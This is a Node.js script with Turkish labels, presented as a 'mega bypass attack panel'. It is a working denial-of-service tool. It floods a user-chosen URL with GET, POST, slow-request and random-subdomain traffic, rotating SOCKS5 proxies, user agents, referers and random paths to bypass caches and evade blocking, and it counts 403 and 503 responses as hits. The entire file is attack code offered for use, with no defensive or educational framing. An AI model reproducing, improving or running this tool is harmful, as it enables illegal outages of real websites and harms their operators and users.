const axios = require('axios');
const fs = require('fs').promises;
const colors = require('colors');
const ora = require('ora');
const { SocksProxyAgent } = require('socks-proxy-agent');
const { randomInt } = require('crypto');
const readline = require('readline');

// Kullanıcı ajanları
const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0',
];

// Referer’lar
const referers = ['https://google.com', 'https://bing.com', 'https://youtube.com'];

// Proxy’ler
let proxies = [];

// Readline arayüzü
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
});

// Proxy yükleyici
async function loadProxies() {
    const spinner = ora('Proxy’ler yükleniyor...').start();
    try {
        const data = await fs.readFile('proxies.txt', 'utf8');
        proxies = data.split('\n').filter(line => line.trim());
        spinner.succeed(`${proxies.length} proxy yüklendi!`.green);
    } catch {
        spinner.warn('Proxy dosyası yok, direkt bağlanılıyor.'.yellow);
    }
}

// Rastgele seçim
const getRandom = (arr) => arr[Math.floor(Math.random() * arr.length)];
const getRandomQuery = () => `?r=${Math.random().toString(36).slice(2)}`;
const getRandomPath = () => `/p${Math.random().toString(36).slice(2, 8)}`;
const randomDelay = () => new Promise(resolve => setTimeout(resolve, randomInt(20, 300)));

// Proxy testi
async function testProxy(proxy) {
    try {
        const [host, port] = proxy.split(':');
        const agent = new SocksProxyAgent(`socks5://${host}:${port}`);
        await axios.get('https://api.ipify.org', { httpAgent: agent, httpsAgent: agent, timeout: 3000 });
        return true;
    } catch {
        return false;
    }
}

// Rastgele subdomain
const getRandomSubdomain = (url) => {
    if (Math.random() > 0.7) return url;
    const host = url.split('/')[2];
    const proto = url.split('/')[0];
    return `${proto}//${Math.random().toString(36).slice(2, 8)}.${host}`;
};

// HTTP isteği
async function sendRequest(targetUrl, cookies = {}, method = 'GET') {
    const headers = {
        'User-Agent': getRandom(userAgents),
        'Accept': getRandom(['text/html,application/xhtml+xml', 'application/json', '*/*']),
        'Accept-Language': getRandom(['en-US,en;q=0.9', 'tr-TR,tr;q=0.8']),
        'Referer': getRandom(referers),
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
    };

    if (Object.keys(cookies).length) {
        headers['Cookie'] = Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ');
    }

    const config = {
        headers,
        timeout: 8000,
        maxRedirects: 10,
        validateStatus: () => true,
    };

    const proxy = getRandom(proxies);
    if (proxy && await testProxy(proxy)) {
        const [host, port] = proxy.split(':');
        config.httpAgent = new SocksProxyAgent(`socks5://${host}:${port}`);
        config.httpsAgent = new SocksProxyAgent(`socks5://${host}:${port}`);
    }

    try {
        let url = targetUrl;
        if (method === 'SUBDOMAIN') url = getRandomSubdomain(targetUrl);
        url += Math.random() > 0.5 ? getRandomQuery() : getRandomPath();

        let response;
        if (method === 'POST') {
            response = await axios.post(url, { data: Math.random() }, config);
        } else if (method === 'SLOWLORIS') {
            await randomDelay();
            response = await axios.get(url, { ...config, timeout: 20000 });
        } else {
            response = await axios.get(url, config);
        }

        const newCookies = response.headers['set-cookie']?.reduce((acc, cookie) => {
            const [keyValue] = cookie.split(';');
            const [key, value] = keyValue.split('=');
            acc[key] = value;
            return acc;
        }, cookies) || cookies;

        return {
            success: response.status < 400 || [403, 503].includes(response.status),
            status: response.status,
            cookies: newCookies,
        };
    } catch (error) {
        return { success: false, error: error.message, cookies };
    }
}

// Kullanıcı girişi
async function getUserInput() {
    console.log(`\n🌌 ${'MEGA BYPASS SALDIRI PANELI'.rainbow.bold} 🌌`);
    console.log('Method seç (numara gir):'.cyan);
    console.log('1 - GET Flood (Hızlı istek)'.green);
    console.log('2 - POST Flood (Form verisi)'.green);
    console.log('3 - Slowloris (Yavaş kitleme)'.green);
    console.log('4 - Subdomain Saldırısı (Cache bypass)'.green);
    console.log('5 - Mixed Mode (Hepsi rastgele)'.green);

    const methodNum = await new Promise(resolve => rl.question('Seçim (1-5): ', resolve));
    const methodMap = {
        '1': 'GET',
        '2': 'POST',
        '3': 'SLOWLORIS',
        '4': 'SUBDOMAIN',
        '5': 'MIXED',
    };
    const method = methodMap[methodNum] || 'GET';

    const url = await new Promise(resolve => rl.question('Hedef URL (örn: http://example.com): '.cyan, resolve));
    if (!url.startsWith('http')) throw new Error('Geçerli URL gir!');

    const duration = await new Promise(resolve => rl.question('Süre (saniye, örn: 60): '.cyan, resolve));
    const threads = await new Promise(resolve => rl.question('Thread sayısı (örn: 10): '.cyan, resolve));

    return {
        method,
        url,
        duration: parseInt(duration) || 60,
        threads: parseInt(threads) || 10,
    };
}

// Ana fonksiyon
async function megaBypassAttack({ method, url, duration, threads }) {
    await loadProxies();
    console.log(`\n⚡ ${'SALDIRI BAŞLIYOR!'.rainbow.bold} ⚡`);
    console.log(`🔗 Hedef: ${url.cyan}`);
    console.log(`⏰ Süre: ${duration}s`.cyan);
    console.log(`⚙️ Thread: ${threads}`.cyan);
    console.log(`🔥 Method: ${method}`.cyan);

    const spinner = ora('Hazırlanıyor...').start();
    const endTime = Date.now() + duration * 1000;
    let successCount = 0;
    let failCount = 0;
    let cookies = {};

    async function worker() {
        while (Date.now() < endTime) {
            await randomDelay();
            const selectedMethod = method === 'MIXED' ? getRandom(['GET', 'POST', 'SLOWLORIS', 'SUBDOMAIN']) : method;
            const result = await sendRequest(url, cookies, selectedMethod);
            cookies = result.cookies;

            if (result.success) {
                successCount++;
                process.stdout.write(`[+] ${result.status} `.green);
            } else {
                failCount++;
                process.stdout.write(`[-] ${result.error.slice(0, 20)} `.red);
            }
        }
    }

    const workers = Array(threads).fill().map(() => worker());
    spinner.succeed('Saldırı aktif!'.green);
    await Promise.all(workers);

    console.log(`\n🎉 ${'BİTTİ!'.rainbow.bold} 🎉`);
    console.log(`✅ Başarılı: ${successCount}`.green);
    console.log(`❌ Hata: ${failCount}`.red);
}

// Çalıştır
(async () => {
    try {
        const input = await getUserInput();
        await megaBypassAttack(input);
    } catch (err) {
        console.error(`Hata: ${err.message}`.red);
    } finally {
        rl.close();
    }
})();